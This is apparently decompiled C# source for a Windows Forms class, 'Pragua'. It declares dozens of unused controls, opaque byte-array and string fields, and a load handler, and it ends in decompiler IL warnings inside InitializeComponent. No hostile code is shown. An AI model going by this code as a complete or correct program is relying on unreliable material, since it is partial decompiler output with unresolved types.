using System;
using System.ComponentModel;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.Drawing.Printing;
using System.IO;
using System.IO.Ports;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Pragua;

[DesignerGenerated]
public class Pragua : Form
{
	private IContainer components;

	[AccessedThroughProperty("TabControl1")]
	private TabControl _TabControl1;

	[AccessedThroughProperty("TabPage1")]
	private TabPage _TabPage1;

	[AccessedThroughProperty("TableLayoutPanel1")]
	private TableLayoutPanel _TableLayoutPanel1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("TabPage2")]
	private TabPage _TabPage2;

	[AccessedThroughProperty("BackgroundWorker1")]
	private BackgroundWorker _BackgroundWorker1;

	[AccessedThroughProperty("SplitContainer1")]
	private SplitContainer _SplitContainer1;

	[AccessedThroughProperty("StatusStrip1")]
	private StatusStrip _StatusStrip1;

	[AccessedThroughProperty("Splitter1")]
	private Splitter _Splitter1;

	[AccessedThroughProperty("ServiceController1")]
	private ServiceController _ServiceController1;

	[AccessedThroughProperty("RichTextBox1")]
	private RichTextBox _RichTextBox1;

	[AccessedThroughProperty("SerialPort1")]
	private SerialPort _SerialPort1;

	[AccessedThroughProperty("PrintPreviewDialog1")]
	private PrintPreviewDialog _PrintPreviewDialog1;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton _RadioButton1;

	[AccessedThroughProperty("Process1")]
	private Process _Process1;

	[AccessedThroughProperty("PropertyGrid1")]
	private PropertyGrid _PropertyGrid1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("ToolStrip1")]
	private ToolStrip _ToolStrip1;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	[AccessedThroughProperty("VScrollBar1")]
	private VScrollBar _VScrollBar1;

	[AccessedThroughProperty("TreeView1")]
	private TreeView _TreeView1;

	[AccessedThroughProperty("TrackBar1")]
	private TrackBar _TrackBar1;

	[AccessedThroughProperty("ToolStripContainer1")]
	private ToolStripContainer _ToolStripContainer1;

	[AccessedThroughProperty("PrintPreviewControl1")]
	private PrintPreviewControl _PrintPreviewControl1;

	[AccessedThroughProperty("DomainUpDown1")]
	private DomainUpDown _DomainUpDown1;

	[AccessedThroughProperty("DateTimePicker1")]
	private DateTimePicker _DateTimePicker1;

	[AccessedThroughProperty("DataGridView1")]
	private DataGridView _DataGridView1;

	[AccessedThroughProperty("FlowLayoutPanel1")]
	private FlowLayoutPanel _FlowLayoutPanel1;

	[AccessedThroughProperty("CheckedListBox1")]
	private CheckedListBox _CheckedListBox1;

	[AccessedThroughProperty("ComboBox1")]
	private ComboBox _ComboBox1;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("BindingNavigator1")]
	private BindingNavigator _BindingNavigator1;

	[AccessedThroughProperty("BindingNavigatorAddNewItem")]
	private ToolStripButton _BindingNavigatorAddNewItem;

	[AccessedThroughProperty("BindingNavigatorCountItem")]
	private ToolStripLabel _BindingNavigatorCountItem;

	[AccessedThroughProperty("BindingNavigatorDeleteItem")]
	private ToolStripButton _BindingNavigatorDeleteItem;

	[AccessedThroughProperty("BindingNavigatorMoveFirstItem")]
	private ToolStripButton _BindingNavigatorMoveFirstItem;

	[AccessedThroughProperty("BindingNavigatorMovePreviousItem")]
	private ToolStripButton _BindingNavigatorMovePreviousItem;

	[AccessedThroughProperty("BindingNavigatorSeparator")]
	private ToolStripSeparator _BindingNavigatorSeparator;

	[AccessedThroughProperty("BindingNavigatorPositionItem")]
	private ToolStripTextBox _BindingNavigatorPositionItem;

	[AccessedThroughProperty("BindingNavigatorSeparator1")]
	private ToolStripSeparator _BindingNavigatorSeparator1;

	[AccessedThroughProperty("BindingNavigatorMoveNextItem")]
	private ToolStripButton _BindingNavigatorMoveNextItem;

	[AccessedThroughProperty("BindingNavigatorMoveLastItem")]
	private ToolStripButton _BindingNavigatorMoveLastItem;

	[AccessedThroughProperty("BindingNavigatorSeparator2")]
	private ToolStripSeparator _BindingNavigatorSeparator2;

	[AccessedThroughProperty("NumericUpDown1")]
	private NumericUpDown _NumericUpDown1;

	[AccessedThroughProperty("MonthCalendar1")]
	private MonthCalendar _MonthCalendar1;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("MaskedTextBox1")]
	private MaskedTextBox _MaskedTextBox1;

	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("HScrollBar1")]
	private HScrollBar _HScrollBar1;

	[AccessedThroughProperty("GroupBox1")]
	private GroupBox _GroupBox1;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("MenuStrip1")]
	private MenuStrip _MenuStrip1;

	[AccessedThroughProperty("SaveFileDialog1")]
	private SaveFileDialog _SaveFileDialog1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("ToolTip1")]
	private ToolTip _ToolTip1;

	[AccessedThroughProperty("PrintDocument1")]
	private PrintDocument _PrintDocument1;

	[AccessedThroughProperty("DirectoryEntry1")]
	private DirectoryEntry _DirectoryEntry1;

	[AccessedThroughProperty("PrintDialog1")]
	private PrintDialog _PrintDialog1;

	[AccessedThroughProperty("DirectorySearcher1")]
	private DirectorySearcher _DirectorySearcher1;

	[AccessedThroughProperty("EventLog1")]
	private EventLog _EventLog1;

	[AccessedThroughProperty("FileSystemWatcher1")]
	private FileSystemWatcher _FileSystemWatcher1;

	[AccessedThroughProperty("ErrorProvider1")]
	private ErrorProvider _ErrorProvider1;

	[AccessedThroughProperty("ContextMenuStrip1")]
	private ContextMenuStrip _ContextMenuStrip1;

	[AccessedThroughProperty("BindingSource1")]
	private BindingSource _BindingSource1;

	[AccessedThroughProperty("ColorDialog1")]
	private ColorDialog _ColorDialog1;

	[AccessedThroughProperty("FolderBrowserDialog1")]
	private FolderBrowserDialog _FolderBrowserDialog1;

	[AccessedThroughProperty("FontDialog1")]
	private FontDialog _FontDialog1;

	[AccessedThroughProperty("NotifyIcon1")]
	private NotifyIcon _NotifyIcon1;

	[AccessedThroughProperty("OpenFileDialog1")]
	private OpenFileDialog _OpenFileDialog1;

	[AccessedThroughProperty("HelpProvider1")]
	private HelpProvider _HelpProvider1;

	[AccessedThroughProperty("ImageList1")]
	private ImageList _ImageList1;

	public string _1;

	public byte[] _2;

	public string _3;

	public string[] _4;

	public byte[] Rock;

	public string Own;

	internal virtual TabControl TabControl1
	{
		get
		{
			return _TabControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TabControl1 = value;
		}
	}

	internal virtual TabPage TabPage1
	{
		get
		{
			return _TabPage1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TabPage1 = value;
		}
	}

	internal virtual TableLayoutPanel TableLayoutPanel1
	{
		get
		{
			return _TableLayoutPanel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TableLayoutPanel1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual TabPage TabPage2
	{
		get
		{
			return _TabPage2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TabPage2 = value;
		}
	}

	internal virtual BackgroundWorker BackgroundWorker1
	{
		get
		{
			return _BackgroundWorker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BackgroundWorker1 = value;
		}
	}

	internal virtual SplitContainer SplitContainer1
	{
		get
		{
			return _SplitContainer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_SplitContainer1 = value;
		}
	}

	internal virtual StatusStrip StatusStrip1
	{
		get
		{
			return _StatusStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_StatusStrip1 = value;
		}
	}

	internal virtual Splitter Splitter1
	{
		get
		{
			return _Splitter1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Splitter1 = value;
		}
	}

	internal virtual ServiceController ServiceController1
	{
		get
		{
			return _ServiceController1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ServiceController1 = value;
		}
	}

	internal virtual RichTextBox RichTextBox1
	{
		get
		{
			return _RichTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RichTextBox1 = value;
		}
	}

	internal virtual SerialPort SerialPort1
	{
		get
		{
			return _SerialPort1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_SerialPort1 = value;
		}
	}

	internal virtual PrintPreviewDialog PrintPreviewDialog1
	{
		get
		{
			return _PrintPreviewDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PrintPreviewDialog1 = value;
		}
	}

	internal virtual RadioButton RadioButton1
	{
		get
		{
			return _RadioButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RadioButton1 = value;
		}
	}

	internal virtual Process Process1
	{
		get
		{
			return _Process1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Process1 = value;
		}
	}

	internal virtual PropertyGrid PropertyGrid1
	{
		get
		{
			return _PropertyGrid1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PropertyGrid1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual ToolStrip ToolStrip1
	{
		get
		{
			return _ToolStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ToolStrip1 = value;
		}
	}

	internal virtual WebBrowser WebBrowser1
	{
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_WebBrowser1 = value;
		}
	}

	internal virtual VScrollBar VScrollBar1
	{
		get
		{
			return _VScrollBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_VScrollBar1 = value;
		}
	}

	internal virtual TreeView TreeView1
	{
		get
		{
			return _TreeView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TreeView1 = value;
		}
	}

	internal virtual TrackBar TrackBar1
	{
		get
		{
			return _TrackBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TrackBar1 = value;
		}
	}

	internal virtual ToolStripContainer ToolStripContainer1
	{
		get
		{
			return _ToolStripContainer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ToolStripContainer1 = value;
		}
	}

	internal virtual PrintPreviewControl PrintPreviewControl1
	{
		get
		{
			return _PrintPreviewControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PrintPreviewControl1 = value;
		}
	}

	internal virtual DomainUpDown DomainUpDown1
	{
		get
		{
			return _DomainUpDown1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DomainUpDown1 = value;
		}
	}

	internal virtual DateTimePicker DateTimePicker1
	{
		get
		{
			return _DateTimePicker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DateTimePicker1 = value;
		}
	}

	internal virtual DataGridView DataGridView1
	{
		get
		{
			return _DataGridView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DataGridView1 = value;
		}
	}

	internal virtual FlowLayoutPanel FlowLayoutPanel1
	{
		get
		{
			return _FlowLayoutPanel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_FlowLayoutPanel1 = value;
		}
	}

	internal virtual CheckedListBox CheckedListBox1
	{
		get
		{
			return _CheckedListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckedListBox1 = value;
		}
	}

	internal virtual ComboBox ComboBox1
	{
		get
		{
			return _ComboBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ComboBox1 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = CheckBox1_CheckedChanged;
			if (_CheckBox1 != null)
			{
				_CheckBox1.remove_CheckedChanged(eventHandler);
			}
			_CheckBox1 = value;
			if (_CheckBox1 != null)
			{
				_CheckBox1.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual BindingNavigator BindingNavigator1
	{
		get
		{
			return _BindingNavigator1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigator1 = value;
		}
	}

	internal virtual ToolStripButton BindingNavigatorAddNewItem
	{
		get
		{
			return _BindingNavigatorAddNewItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorAddNewItem = value;
		}
	}

	internal virtual ToolStripLabel BindingNavigatorCountItem
	{
		get
		{
			return _BindingNavigatorCountItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorCountItem = value;
		}
	}

	internal virtual ToolStripButton BindingNavigatorDeleteItem
	{
		get
		{
			return _BindingNavigatorDeleteItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorDeleteItem = value;
		}
	}

	internal virtual ToolStripButton BindingNavigatorMoveFirstItem
	{
		get
		{
			return _BindingNavigatorMoveFirstItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorMoveFirstItem = value;
		}
	}

	internal virtual ToolStripButton BindingNavigatorMovePreviousItem
	{
		get
		{
			return _BindingNavigatorMovePreviousItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorMovePreviousItem = value;
		}
	}

	internal virtual ToolStripSeparator BindingNavigatorSeparator
	{
		get
		{
			return _BindingNavigatorSeparator;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorSeparator = value;
		}
	}

	internal virtual ToolStripTextBox BindingNavigatorPositionItem
	{
		get
		{
			return _BindingNavigatorPositionItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorPositionItem = value;
		}
	}

	internal virtual ToolStripSeparator BindingNavigatorSeparator1
	{
		get
		{
			return _BindingNavigatorSeparator1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorSeparator1 = value;
		}
	}

	internal virtual ToolStripButton BindingNavigatorMoveNextItem
	{
		get
		{
			return _BindingNavigatorMoveNextItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorMoveNextItem = value;
		}
	}

	internal virtual ToolStripButton BindingNavigatorMoveLastItem
	{
		get
		{
			return _BindingNavigatorMoveLastItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorMoveLastItem = value;
		}
	}

	internal virtual ToolStripSeparator BindingNavigatorSeparator2
	{
		get
		{
			return _BindingNavigatorSeparator2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorSeparator2 = value;
		}
	}

	internal virtual NumericUpDown NumericUpDown1
	{
		get
		{
			return _NumericUpDown1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_NumericUpDown1 = value;
		}
	}

	internal virtual MonthCalendar MonthCalendar1
	{
		get
		{
			return _MonthCalendar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_MonthCalendar1 = value;
		}
	}

	internal virtual Panel Panel1
	{
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual MaskedTextBox MaskedTextBox1
	{
		get
		{
			return _MaskedTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_MaskedTextBox1 = value;
		}
	}

	internal virtual ListView ListView1
	{
		get
		{
			return _ListView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListView1 = value;
		}
	}

	internal virtual ListBox ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual HScrollBar HScrollBar1
	{
		get
		{
			return _HScrollBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_HScrollBar1 = value;
		}
	}

	internal virtual GroupBox GroupBox1
	{
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_GroupBox1 = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_LinkLabel1 = value;
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual MenuStrip MenuStrip1
	{
		get
		{
			return _MenuStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_MenuStrip1 = value;
		}
	}

	internal virtual SaveFileDialog SaveFileDialog1
	{
		get
		{
			return _SaveFileDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_SaveFileDialog1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Timer1 = value;
		}
	}

	internal virtual ToolTip ToolTip1
	{
		get
		{
			return _ToolTip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ToolTip1 = value;
		}
	}

	internal virtual PrintDocument PrintDocument1
	{
		get
		{
			return _PrintDocument1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PrintDocument1 = value;
		}
	}

	internal virtual DirectoryEntry DirectoryEntry1
	{
		get
		{
			return _DirectoryEntry1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DirectoryEntry1 = value;
		}
	}

	internal virtual PrintDialog PrintDialog1
	{
		get
		{
			return _PrintDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PrintDialog1 = value;
		}
	}

	internal virtual DirectorySearcher DirectorySearcher1
	{
		get
		{
			return _DirectorySearcher1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DirectorySearcher1 = value;
		}
	}

	internal virtual EventLog EventLog1
	{
		get
		{
			return _EventLog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_EventLog1 = value;
		}
	}

	internal virtual FileSystemWatcher FileSystemWatcher1
	{
		get
		{
			return _FileSystemWatcher1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_FileSystemWatcher1 = value;
		}
	}

	internal virtual ErrorProvider ErrorProvider1
	{
		get
		{
			return _ErrorProvider1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ErrorProvider1 = value;
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip1
	{
		get
		{
			return _ContextMenuStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ContextMenuStrip1 = value;
		}
	}

	internal virtual BindingSource BindingSource1
	{
		get
		{
			return _BindingSource1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingSource1 = value;
		}
	}

	internal virtual ColorDialog ColorDialog1
	{
		get
		{
			return _ColorDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ColorDialog1 = value;
		}
	}

	internal virtual FolderBrowserDialog FolderBrowserDialog1
	{
		get
		{
			return _FolderBrowserDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_FolderBrowserDialog1 = value;
		}
	}

	internal virtual FontDialog FontDialog1
	{
		get
		{
			return _FontDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_FontDialog1 = value;
		}
	}

	internal virtual NotifyIcon NotifyIcon1
	{
		get
		{
			return _NotifyIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_NotifyIcon1 = value;
		}
	}

	internal virtual OpenFileDialog OpenFileDialog1
	{
		get
		{
			return _OpenFileDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_OpenFileDialog1 = value;
		}
	}

	internal virtual HelpProvider HelpProvider1
	{
		get
		{
			return _HelpProvider1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_HelpProvider1 = value;
		}
	}

	internal virtual ImageList ImageList1
	{
		get
		{
			return _ImageList1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ImageList1 = value;
		}
	}

	public Pragua()
	{
		((Form)this).add_Load((EventHandler)Krulises_Load);
		Own = null;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Expected O, but got Unknown
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Expected O, but got Unknown
		//IL_0167: Unknown result type (might be due to invalid IL or missing references)
		//IL_0171: Expected O, but got Unknown
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_017c: Expected O, but got Unknown
		//IL_017d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0187: Expected O, but got Unknown
		//IL_0188: Unknown result type (might be due to invalid IL or missing references)
		//IL_0192: Expected O, but got Unknown
		//IL_0193: Unknown result type (might be due to invalid IL or missing references)
		//IL_019d: Expected O, but got Unknown
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ae: Expected O, but got Unknown
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Expected O, but got Unknown
		//IL_01ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c4: Expected O, but got Unknown
		//IL_01c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cf: Expected O, but got Unknown
		//IL_01d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01da: Expected O, but got Unknown
		//IL_01db: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e5: Expected O, but got Unknown
		//IL_01e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f0: Expected O, but got Unknown
		//IL_01f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Expected O, but got Unknown
		//IL_01fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0206: Expected O, but got Unknown
		//IL_0207: Unknown result type (might be due to invalid IL or missing references)
		//IL_0211: Expected O, but got Unknown
		//IL_0212: Unknown result type (might be due to invalid IL or missing references)
		//IL_021c: Expected O, but got Unknown
		//IL_022e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0238: Expected O, but got Unknown
		//IL_0239: Unknown result type (might be due to invalid IL or missing references)
		//IL_0243: Expected O, but got Unknown
		//IL_0244: Unknown result type (might be due to invalid IL or missing references)
		//IL_024e: Expected O, but got Unknown
		//IL_0255: Unknown result type (might be due to invalid IL or missing references)
		//IL_025f: Expected O, but got Unknown
		//IL_0266: Unknown result type (might be due to invalid IL or missing references)
		//IL_0270: Expected O, but got Unknown
		//IL_0271: Unknown result type (might be due to invalid IL or missing references)
		//IL_027b: Expected O, but got Unknown
		//IL_027c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0286: Expected O, but got Unknown
		//IL_0287: Unknown result type (might be due to invalid IL or missing references)
		//IL_0291: Expected O, but got Unknown
		//IL_0292: Unknown result type (might be due to invalid IL or missing references)
		//IL_029c: Expected O, but got Unknown
		//IL_02a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ad: Expected O, but got Unknown
		//IL_02ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b8: Expected O, but got Unknown
		//IL_02b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c3: Expected O, but got Unknown
		//IL_02c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ce: Expected O, but got Unknown
		//IL_02cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d9: Expected O, but got Unknown
		//IL_02e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ea: Expected O, but got Unknown
		//IL_02eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f5: Expected O, but got Unknown
		//IL_02f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0300: Expected O, but got Unknown
		//IL_0301: Unknown result type (might be due to invalid IL or missing references)
		//IL_030b: Expected O, but got Unknown
		//IL_030c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0316: Expected O, but got Unknown
		//IL_0317: Unknown result type (might be due to invalid IL or missing references)
		//IL_0321: Expected O, but got Unknown
		//IL_0322: Unknown result type (might be due to invalid IL or missing references)
		//IL_032c: Expected O, but got Unknown
		//IL_032d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0337: Expected O, but got Unknown
		//IL_0338: Unknown result type (might be due to invalid IL or missing references)
		//IL_0342: Expected O, but got Unknown
		//IL_0343: Unknown result type (might be due to invalid IL or missing references)
		//IL_034d: Expected O, but got Unknown
		//IL_034e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0358: Expected O, but got Unknown
		//IL_035f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0369: Expected O, but got Unknown
		//IL_036a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0374: Expected O, but got Unknown
		//IL_0375: Unknown result type (might be due to invalid IL or missing references)
		//IL_037f: Expected O, but got Unknown
		//IL_0380: Unknown result type (might be due to invalid IL or missing references)
		//IL_038a: Expected O, but got Unknown
		//IL_051e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0585: Unknown result type (might be due to invalid IL or missing references)
		//IL_058f: Expected O, but got Unknown
